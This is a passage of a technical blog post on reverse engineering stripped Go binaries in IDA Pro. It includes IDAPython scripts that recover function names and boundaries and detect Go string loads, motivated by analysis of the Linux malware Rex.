    <content type="html"><![CDATA[<p>GO binaries are weird, or at least, that is where this all started out. While delving into some <a href="http://securityaffairs.co/wordpress/50556/malware/linux-rex-1-botnet.html" target="_blank" rel="external">Linux malware named Rex</a>, I came to the realization that I might need to understand more than I wanted to. Just the prior week I had been reversing <a href="https://news.drweb.com/news/?i=10140&amp;lng=en" target="_blank" rel="external">Linux Lady</a> which was also written in GO, however it was not a stripped binary so it was pretty easy. Clearly the binary was rather large, many extra methods I didn’t care about - though I really just didn’t understand why. To be honest - I still haven’t fully dug into the Golang code and have yet to really write much code in Go, so take this information at face value as some of it might be incorrect; this is just my experience while reversing some ELF Go binaries! If you don’t want to read the whole page, or scroll to the bottom to get a link to the full repo, just go <a href="https://github.com/strazzere/golang_loader_assist" target="_blank" rel="external">here</a>.<br><a id="more"></a></p>
<p>To illistrate some of my examples I’m going to use an extremely simple ‘Hello, World!’ example and also reference the Rex malware. The code and a Make file are extremely simple;</p>
<figure class="highlight go"><figcaption><span>Hello.go</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">    fmt.Println(<span class="string">"Hello, World!"</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight bash"><figcaption><span>Makefile</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">all:</div><div class="line">	GOOS=linux GOARCH=386 go build -o hello-stripped -ldflags <span class="string">"-s"</span> hello.go</div><div class="line">	GOOS=linux GOARCH=386 go build -o hello-normal hello.go</div></pre></td></tr></table></figure>
<p>Since I’m working on an OSX machine, the above <code>GOOS</code> and <code>GOARCH</code> variables are explicitly needed to cross-compile this correctly. The first line also added the <code>ldflags</code> option to strip the binary. This way we can analyze the same executable both stripped and without being stripped. Copy these files, run <code>make</code> and then open up the files in your disassembler of choice, for this blog I’m going to use IDA Pro. If we open up the unstripped binary in IDA Pro we can notice a few quick things;</p>
<p><img src="/images/reversing_go_binaries_like_a_pro/unstripped_main.png" alt=""></p>
<p>Well then - our 5 lines of code has turned into over 2058 functions. With all that overhead of what appears to be a runtime, we also have nothing interesting in the <code>main()</code> function. If we dig in a bit further we can see that the actual code we’re interested in is inside of <code>main_main</code>;</p>
<p><img src="/images/reversing_go_binaries_like_a_pro/unstripped_main_main.png" alt=""></p>
<p>This is, well, lots of code that I honestly don’t want to look at. The string loading also looks a bit weird - though IDA seems to have done a good job identifying the necessary bits. We can easily see that the string load is actually a set of three <code>mov</code>s;</p>
<figure class="highlight plain"><figcaption><span>String load</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mov     ebx, offset aHelloWorld ; &quot;Hello, World!&quot;</div><div class="line">mov     [esp+3Ch+var_14], ebx ; Shove string into location</div><div class="line">mov     [esp+3Ch+var_10], 0Dh ; length of string</div></pre></td></tr></table></figure>
<p>This isn’t exactly revolutionary, though I can’t off the top of my head say that I’ve seen something like this before. We’re also taking note of it as this will come in handle later on. The other tidbit of code which caught my eye was the <code>runtime_morestack_context</code> call;</p>
<figure class="highlight plain"><figcaption><span>morestack_context</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">loc_80490CB:</div><div class="line">call    runtime_morestack_noctxt</div><div class="line">jmp     main_main</div></pre></td></tr></table></figure>
<p>This style block of code appears to always be at the end of functions and it also seems to always loop back up to the top of the same function. This is verified by looking at the cross-references to this function. Ok, now that we know IDA Pro can handle unstripped binaries, lets load the same code but the stripped version this time.</p>
<p><img src="/images/reversing_go_binaries_like_a_pro/stripped_start.png" alt=""></p>
<p>Immediately we see some, well, lets just call them “differences”. We have 1329 functions defined and now see some undefined code by looking at the navigator toolbar. Luckily IDA has still been able to find the string load we are looking for, however this function now seems much less friendly to deal with.</p>
<p><img src="/images/reversing_go_binaries_like_a_pro/stripped_main_main.png" alt=""></p>
<p>We now have no more function names, however - the function names appear to be retained in a specific section of the binary if we do a string search for <code>main.main</code> (which would be repesented at <code>main_main</code> in the previous screen shots due to how a <code>.</code> is interpreted by IDA);</p>
<figure class="highlight plain"><figcaption><span>.gopclntab</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">.gopclntab:0813E174                 db  6Dh ; m</div><div class="line">.gopclntab:0813E175                 db  61h ; a</div><div class="line">.gopclntab:0813E176                 db  69h ; i</div><div class="line">.gopclntab:0813E177                 db  6Eh ; n</div><div class="line">.gopclntab:0813E178                 db  2Eh ; .</div><div class="line">.gopclntab:0813E179                 db  6Dh ; m</div><div class="line">.gopclntab:0813E17A                 db  61h ; a</div><div class="line">.gopclntab:0813E17B                 db  69h ; i</div><div class="line">.gopclntab:0813E17C                 db  6Eh ; n</div></pre></td></tr></table></figure>
<p>Alright, so it would appear that there is something left over here. After digging into some of the Google results into <code>gopclntab</code> and tweet about this - a friendly reverser <a href="https://twitter.com/groke1105" target="_blank" rel="external">George (Egor?) Zaytsev</a> showed me his IDA Pro scripts for <a href="https://gitlab.com/zaytsevgu/goutils" target="_blank" rel="external">renaming function and adding type information</a>. After skimming these it was pretty easy to figure out the format of this section so I threw together some functionally to replicate his script. The essential code is shown below, very simply put, we look into the segment <code>.gopclntab</code> and skip the first 8 bytes. We then create a pointer (<code>Qword</code> or <code>Dword</code> dependant on whether the binary is 64bit or not). The first set of data actually gives us the size of the <code>.gopclntab</code> table, so we know how far to go into this structure. Now we can start processing the rest of the data which appears to be the <code>function_offset</code> followed by the (function) <code>name_offset</code>). As we create pointers to these offsets and also tell IDA to create the strings, we just need to ensure we don’t pass <code>MakeString</code> any bad characters so we use the <code>clean_function_name</code> function to strip out any badness.</p>
<figure class="highlight python"><figcaption><span>renamer.py</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_pointer</span><span class="params">(addr, force_size=None)</span>:</span></div><div class="line">    <span class="keyword">if</span> force_size <span class="keyword">is</span> <span class="keyword">not</span> <span class="number">4</span> <span class="keyword">and</span> (idaapi.get_inf_structure().is_64bit() <span class="keyword">or</span> force_size <span class="keyword">is</span> <span class="number">8</span>):</div><div class="line">        MakeQword(addr)</div><div class="line">	<span class="keyword">return</span> Qword(addr), <span class="number">8</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">	MakeDword(addr)</div><div class="line">	<span class="keyword">return</span> Dword(addr), <span class="number">4</span></div><div class="line"></div><div class="line">STRIP_CHARS = [ <span class="string">'('</span>, <span class="string">')'</span>, <span class="string">'['</span>, <span class="string">']'</span>, <span class="string">'&#123;'</span>, <span class="string">'&#125;'</span>, <span class="string">' '</span>, <span class="string">'"'</span> ]</div><div class="line">REPLACE_CHARS = [<span class="string">'.'</span>, <span class="string">'*'</span>, <span class="string">'-'</span>, <span class="string">','</span>, <span class="string">';'</span>, <span class="string">':'</span>, <span class="string">'/'</span>, <span class="string">'\xb7'</span> ]</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean_function_name</span><span class="params">(str)</span>:</span></div><div class="line">    <span class="comment"># Kill generic 'bad' characters</span></div><div class="line">    str = filter(<span class="keyword">lambda</span> x: x <span class="keyword">in</span> string.printable, str)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> STRIP_CHARS:</div><div class="line">        str = str.replace(c, <span class="string">''</span>)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> REPLACE_CHARS:</div><div class="line">        str = str.replace(c, <span class="string">'_'</span>)</div><div class="line"></div><div class="line">    <span class="keyword">return</span> str</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">renamer_init</span><span class="params">()</span>:</span></div><div class="line">    renamed = <span class="number">0</span></div><div class="line"></div><div class="line">    gopclntab = ida_segment.get_segm_by_name(<span class="string">'.gopclntab'</span>)</div><div class="line">    <span class="keyword">if</span> gopclntab <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">        <span class="comment"># Skip unimportant header and goto section size</span></div><div class="line">        addr = gopclntab.startEA + <span class="number">8</span></div><div class="line">        size, addr_size = create_pointer(addr)</div><div class="line">        addr += addr_size</div><div class="line"></div><div class="line">        <span class="comment"># Unsure if this end is correct</span></div><div class="line">        early_end = addr + (size * addr_size * <span class="number">2</span>)</div><div class="line">        <span class="keyword">while</span> addr &lt; early_end:</div><div class="line">            func_offset, addr_size = create_pointer(addr)</div><div class="line">            name_offset, addr_size = create_pointer(addr + addr_size)</div><div class="line">            addr += addr_size * <span class="number">2</span></div><div class="line"></div><div class="line">            func_name_addr = Dword(name_offset + gopclntab.startEA + addr_size) + gopclntab.startEA</div><div class="line">            func_name = GetString(func_name_addr)</div><div class="line">            MakeStr(func_name_addr, func_name_addr + len(func_name))</div><div class="line">            appended = clean_func_name = clean_function_name(func_name)</div><div class="line">            debug(<span class="string">'Going to remap function at 0x%x with %s - cleaned up as %s'</span> % (func_offset, func_name, clean_func_name))</div><div class="line"></div><div class="line">            <span class="keyword">if</span> ida_funcs.get_func_name(func_offset) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">                <span class="keyword">if</span> MakeName(func_offset, clean_func_name):</div><div class="line">                    renamed += <span class="number">1</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    error(<span class="string">'clean_func_name error %s'</span> % clean_func_name)</div><div class="line"></div><div class="line">    <span class="keyword">return</span> renamed</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    renamed = renamer_init()</div><div class="line">    info(<span class="string">'Found and successfully renamed %d functions!'</span> % renamed)</div></pre></td></tr></table></figure>
<p>The above code won’t actually run yet (don’t worry full code available in <a href="https://github.com/strazzere/golang_loader_assist" target="_blank" rel="external">this repo</a> ) but it is hopefully simple enough to read through and understand the process. However, this still doesn’t solve the problem that IDA Pro doesn’t know <em>all</em> the functions. So this is going to create pointers which aren’t being referenced anywhere. We do know the beginning of functions now, however I ended up seeing (what I think is) an easier way to define all the functions in the application. We can define all the functions by utilizing <code>runtime_morestack_noctxt</code> function. Since every function utilizes this (basically, there is an edgecase it turns out), if we find this function and traverse backwards to the cross references to this function, then we will know where every function exists. So what, right? We already know where every function started from the segment we just parsed above, right? Ah, well - now we know the end of the function <em>and</em> the next instruction after the call to <code>runtime_morestack_noctxt</code> gives us a jump to the top of the function. This means we should quickly be able to give the bounds of the start and stop of a function, which is required by IDA, while seperating this from the parsing of the function names. If we open up the window for cross references to the function <code>runtime_morestack_noctxt</code> we see there are many more undefined sections calling into this. 1774 in total things reference this function, which is up from the 1329 functions IDA has already defined for us, this is highlighted by the image below;</p>
<p><img src="/images/reversing_go_binaries_like_a_pro/stripped_runtime_morestack_noctxt.png" alt=""></p>
<p>After digging into mutliple binaries we can see the <code>runtime_morestack_noctext</code> will always call into <code>runtime_morestack</code> (with context). This is the edgecase I was referencing before, so between these two functions we should be able to see cross refereneces to ever other function used in the binary. Looking at the larger of the two functions, <code>runtime_more_stack</code>, of multiple binaries tends to have an interesting layout;</p>
<p><img src="/images/reversing_go_binaries_like_a_pro/unstripped_runtime_morestack.png" alt=""></p>
<p>The part which stuck out to me was <code>mov large dword ptr ds:1003h, 0</code> - this appeared to be rather constant in all 64bit binaries I saw. So after cross compiling a few more I noticed that 32bit binaries used <code>mov qword ptr ds:1003h, 0</code>, so we will be hunting for this pattern to create a “hook” for traversing backwards on. Lucky for us, I haven’t seen an instance where IDA Pro fails to define this specific function, we don’t really need to spend much brain power mapping it out or defining it outselves. So, enough talk, lets write some code to find this function;</p>
<figure class="highlight python"><figcaption><span>find_runtime_morestack.py</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_runtime_ms</span><span class="params">()</span>:</span></div><div class="line">    debug(<span class="string">'Attempting to find runtime_morestack function for hooking on...'</span>)</div><div class="line"></div><div class="line">    text_seg = ida_segment.get_segm_by_name(<span class="string">'.text'</span>)</div><div class="line">    <span class="comment"># This code string appears to work for ELF32 and ELF64 AFAIK</span></div><div class="line">    runtime_ms_end = ida_search.find_text(text_seg.startEA, <span class="number">0</span>, <span class="number">0</span>, <span class="string">"word ptr ds:1003h, 0"</span>, SEARCH_DOWN)</div><div class="line">    runtime_ms = ida_funcs.get_func(runtime_ms_end)</div><div class="line">    <span class="keyword">if</span> idc.MakeNameEx(runtime_ms.startEA, <span class="string">"runtime_morecontext"</span>, SN_PUBLIC):</div><div class="line">        debug(<span class="string">'Successfully found runtime_morecontext'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        debug(<span class="string">'Failed to rename function @ 0x%x to runtime_morestack'</span> % runtime_ms.startEA)</div><div class="line"></div><div class="line">    <span class="keyword">return</span> runtime_ms</div></pre></td></tr></table></figure>
<p>After finding the function, we can recursively traverse backwards through all the function calls, anything which is not inside an already defined function we can now define. This is because the structure always appears to be;</p>
<figure class="highlight plain"><figcaption><span>golang_undefined_function_example</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">.text:08089910				               ; Function start - however undefined currently according to IDA Pro</div><div class="line">.text:08089910 loc_8089910:                            ; CODE XREF: .text:0808994B</div><div class="line">.text:08089910                                         ; DATA XREF: sub_804B250+1A1</div><div class="line">.text:08089910                 mov     ecx, large gs:0</div><div class="line">.text:08089917                 mov     ecx, [ecx-4]</div><div class="line">.text:0808991D                 cmp     esp, [ecx+8]</div><div class="line">.text:08089920                 jbe     short loc_8089946</div><div class="line">.text:08089922                 sub     esp, 4</div><div class="line">.text:08089925                 mov     ebx, [edx+4]</div><div class="line">.text:08089928                 mov     [esp], ebx</div><div class="line">.text:0808992B                 cmp     dword ptr [esp], 0</div><div class="line">.text:0808992F                 jz      short loc_808993E</div><div class="line">.text:08089931</div><div class="line">.text:08089931 loc_8089931:                            ; CODE XREF: .text:08089944</div><div class="line">.text:08089931                 add     dword ptr [esp], 30h</div><div class="line">.text:08089935                 call    sub_8052CB0</div><div class="line">.text:0808993A                 add     esp, 4</div><div class="line">.text:0808993D                 retn</div><div class="line">.text:0808993E ; ---------------------------------------------------------------------------</div><div class="line">.text:0808993E</div><div class="line">.text:0808993E loc_808993E:                            ; CODE XREF: .text:0808992F</div><div class="line">.text:0808993E                 mov     large ds:0, eax</div><div class="line">.text:08089944                 jmp     short loc_8089931</div><div class="line">.text:08089946 ; ---------------------------------------------------------------------------</div><div class="line">.text:08089946</div><div class="line">.text:08089946 loc_8089946:                            ; CODE XREF: .text:08089920</div><div class="line">.text:08089946                 call    runtime_morestack ; &quot;Bottom&quot; of function, calls out to runtime_morestack</div><div class="line">.text:0808994B                 jmp     short loc_8089910 ; Jump back to the &quot;top&quot; of the function</div></pre></td></tr></table></figure>
<p>The above snippet is a random undefined function I pulled from the stripped example application we compiled already. Essentially by traversing backwards into every undefined function, we will land at something like line <code>0x0808994B</code> which is the <code>call runtime_morestack</code>. From here we will skip to the next instruction and ensure it is a jump above where we currently are, if this is true, we can likely assume this is the start of a function. In this example (and almost every test case I’ve run) this is true. Jumping to <code>0x08089910</code> is the start of the function, so now we have the two parameters required by <code>MakeFunction</code> function;</p>
<figure class="highlight python"><figcaption><span>traverse_functions.py</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_simple_wrapper</span><span class="params">(addr)</span>:</span></div><div class="line">    <span class="keyword">if</span> GetMnem(addr) == <span class="string">'xor'</span> <span class="keyword">and</span> GetOpnd(addr, <span class="number">0</span>) == <span class="string">'edx'</span> <span class="keyword">and</span>  GetOpnd(addr, <span class="number">1</span>) == <span class="string">'edx'</span>:</div><div class="line">        addr = FindCode(addr, SEARCH_DOWN)</div><div class="line">        <span class="keyword">if</span> GetMnem(addr) == <span class="string">'jmp'</span> <span class="keyword">and</span> GetOpnd(addr, <span class="number">0</span>) == <span class="string">'runtime_morestack'</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_runtime_ms</span><span class="params">()</span>:</span></div><div class="line">    debug(<span class="string">'Attempting to find runtime_morestack function for hooking on...'</span>)</div><div class="line"></div><div class="line">    text_seg = ida_segment.get_segm_by_name(<span class="string">'.text'</span>)</div><div class="line">    <span class="comment"># This code string appears to work for ELF32 and ELF64 AFAIK</span></div><div class="line">    runtime_ms_end = ida_search.find_text(text_seg.startEA, <span class="number">0</span>, <span class="number">0</span>, <span class="string">"word ptr ds:1003h, 0"</span>, SEARCH_DOWN)</div><div class="line">    runtime_ms = ida_funcs.get_func(runtime_ms_end)</div><div class="line">    <span class="keyword">if</span> idc.MakeNameEx(runtime_ms.startEA, <span class="string">"runtime_morestack"</span>, SN_PUBLIC):</div><div class="line">        debug(<span class="string">'Successfully found runtime_morestack'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        debug(<span class="string">'Failed to rename function @ 0x%x to runtime_morestack'</span> % runtime_ms.startEA)</div><div class="line"></div><div class="line">    <span class="keyword">return</span> runtime_ms</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">traverse_xrefs</span><span class="params">(func)</span>:</span></div><div class="line">    func_created = <span class="number">0</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> func <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">return</span> func_created</div><div class="line"></div><div class="line">    <span class="comment"># First</span></div><div class="line">    func_xref = ida_xref.get_first_cref_to(func.startEA)</div><div class="line">    <span class="comment"># Attempt to go through crefs</span></div><div class="line">    <span class="keyword">while</span> func_xref != <span class="number">0xffffffffffffffff</span>:</div><div class="line">        <span class="comment"># See if there is a function already here</span></div><div class="line">        <span class="keyword">if</span> ida_funcs.get_func(func_xref) <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="comment"># Ensure instruction bit looks like a jump</span></div><div class="line">            func_end = FindCode(func_xref, SEARCH_DOWN)</div><div class="line">            <span class="keyword">if</span> GetMnem(func_end) == <span class="string">"jmp"</span>:</div><div class="line">                <span class="comment"># Ensure we're jumping back "up"</span></div><div class="line">                func_start = GetOperandValue(func_end, <span class="number">0</span>)</div><div class="line">                <span class="keyword">if</span> func_start &lt; func_xref:</div><div class="line">                    <span class="keyword">if</span> idc.MakeFunction(func_start, func_end):</div><div class="line">                        func_created += <span class="number">1</span></div><div class="line">                    <span class="keyword">else</span>:</div><div class="line">                        <span class="comment"># If this fails, we should add it to a list of failed functions</span></div><div class="line">                        <span class="comment"># Then create small "wrapper" functions and backtrack through the xrefs of this</span></div><div class="line">                        error(<span class="string">'Error trying to create a function @ 0x%x - 0x%x'</span> %(func_start, func_end))</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            xref_func = ida_funcs.get_func(func_xref)</div><div class="line">            <span class="comment"># Simple wrapper is often runtime_morestack_noctxt, sometimes it isn't though...</span></div><div class="line">            <span class="keyword">if</span> is_simple_wrapper(xref_func.startEA):</div><div class="line">                debug(<span class="string">'Stepping into a simple wrapper'</span>)</div><div class="line">                func_created += traverse_xrefs(xref_func)</div><div class="line">            <span class="keyword">if</span> ida_funcs.get_func_name(xref_func.startEA) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">and</span> <span class="string">'sub_'</span> <span class="keyword">not</span> <span class="keyword">in</span> ida_funcs.get_func_name(xref_func.startEA):</div><div class="line">                debug(<span class="string">'Function @0x%x already has a name of %s; skipping...'</span> % (func_xref, ida_funcs.get_func_name(xref_func.startEA)))</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                debug(<span class="string">'Function @ 0x%x already has a name %s'</span> % (xref_func.startEA, ida_funcs.get_func_name(xref_func.startEA)))</div><div class="line"></div><div class="line">        func_xref = ida_xref.get_next_cref_to(func.startEA, func_xref)</div><div class="line"></div><div class="line">    <span class="keyword">return</span> func_created</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_func_by_name</span><span class="params">(name)</span>:</span></div><div class="line">    text_seg = ida_segment.get_segm_by_name(<span class="string">'.text'</span>)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> Functions(text_seg.startEA, text_seg.endEA):</div><div class="line">        <span class="keyword">if</span> name == ida_funcs.get_func_name(addr):</div><div class="line">            <span class="keyword">return</span> ida_funcs.get_func(addr)</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">runtime_init</span><span class="params">()</span>:</span></div><div class="line">    func_created = <span class="number">0</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> find_func_by_name(<span class="string">'runtime_morestack'</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">        func_created += traverse_xrefs(find_func_by_name(<span class="string">'runtime_morestack'</span>))</div><div class="line">        func_created += traverse_xrefs(find_func_by_name(<span class="string">'runtime_morestack_noctxt'</span>))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        runtime_ms = create_runtime_ms()</div><div class="line">        func_created = traverse_xrefs(runtime_ms)</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">return</span> func_created</div></pre></td></tr></table></figure>
<p>That code bit is a bit lengthy, though hopefully the comments and concept is clear enough. It likely isn’t necessary to explicitly traverse backwards recursively, however I wrote this prior to understanding that <code>runtime_morestack_noctxt</code> (the edgecase) is the only edgecase that I would encounter. This was being handled by the <code>is_simple_wrapper</code> function originally. Regardless, running this style of code ended up finding all the extra functions IDA Pro was missing. We can see below, that this creates a much cleaner and easier experience to reverse;</p>
<p><img src="/images/reversing_go_binaries_like_a_pro/stripped_0808994B.png" alt=""></p>
<p>This can allow us to use something like <a href="https://github.com/joxeankoret/diaphora" target="_blank" rel="external">Diaphora</a> as well since we can specifically target functions with the same names, if we care too. I’ve personally found this is extremely useful for malware or other targets where you <em>really</em> don’t care about any of the framework/runtime functions. You can quiet easily differentiate between custom code written for the binary, for example in the Linux malware “Rex” everything because with that name space! Now onto the last challenge that I wanted to solve while reversing the malware, string loading! I’m honestly not 100% sure how IDA detects most string loads, potentially through idioms of some sort? Or maybe because it can detect strings based on the <code>\00</code> character at the end of it? Regardless, Go seems to use a string table of some sort, without requiring null character. The appear to be in alpha-numeric order, group by string length size as well. This means we see them all there, but often don’t come across them correctly asserted as strings, or we see them asserted as extremely large blobs of strings. The hello world example isn’t good at illistrating this, so I’ll pull open the <code>main.main</code> function of the Rex malware to show this;</p>
<p><img src="/images/reversing_go_binaries_like_a_pro/stripped_rex_no_strings.png" alt=""></p>
<p>I didn’t want to add comments to everything, so I only commented the first few lines then pointed arrows to where there should be pointers to a proper string. We can see a few different use cases and sometimes the destination registers seem to change. However there is definitely a pattern which forms that we can look for. Moving of a pointer into a register, that register is then used to push into a (d)word pointer, followed by a load of a lenght of the string. Cobbling together some python to hunt for the pattern we end with something like the pseudo code below;</p>
<figure class="highlight python"><figcaption><span>string_hunting.py</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Currently it's normally ebx, but could in theory be anything - seen ebp</span></div><div class="line">VALID_REGS = [<span class="string">'ebx'</span>, <span class="string">'ebp'</span>]</div><div class="line"></div><div class="line"><span class="comment"># Currently it's normally esp, but could in theory be anything - seen eax</span></div><div class="line">VALID_DEST = [<span class="string">'esp'</span>, <span class="string">'eax'</span>, <span class="string">'ecx'</span>, <span class="string">'edx'</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_string_load</span><span class="params">(addr)</span>:</span></div><div class="line">    patterns = []</div><div class="line">    <span class="comment"># Check for first part</span></div><div class="line">    <span class="keyword">if</span> GetMnem(addr) == <span class="string">'mov'</span>:</div><div class="line">        <span class="comment"># Could be unk_ or asc_, ignored ones could be loc_ or inside []</span></div><div class="line">        <span class="keyword">if</span> GetOpnd(addr, <span class="number">0</span>) <span class="keyword">in</span> VALID_REGS <span class="keyword">and</span> <span class="keyword">not</span> (<span class="string">'['</span> <span class="keyword">in</span> GetOpnd(addr, <span class="number">1</span>) <span class="keyword">or</span> <span class="string">'loc_'</span> <span class="keyword">in</span> GetOpnd(addr, <span class="number">1</span>)) <span class="keyword">and</span>(<span class="string">'offset '</span> <span class="keyword">in</span> GetOpnd(addr, <span class="number">1</span>) <span class="keyword">or</span> <span class="string">'h'</span> <span class="keyword">in</span> GetOpnd(addr, <span class="number">1</span>)):</div><div class="line">            from_reg = GetOpnd(addr, <span class="number">0</span>)</div><div class="line">            <span class="comment"># Check for second part</span></div><div class="line">            addr_2 = FindCode(addr, SEARCH_DOWN)</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                dest_reg = GetOpnd(addr_2, <span class="number">0</span>)[GetOpnd(addr_2, <span class="number">0</span>).index(<span class="string">'['</span>) + <span 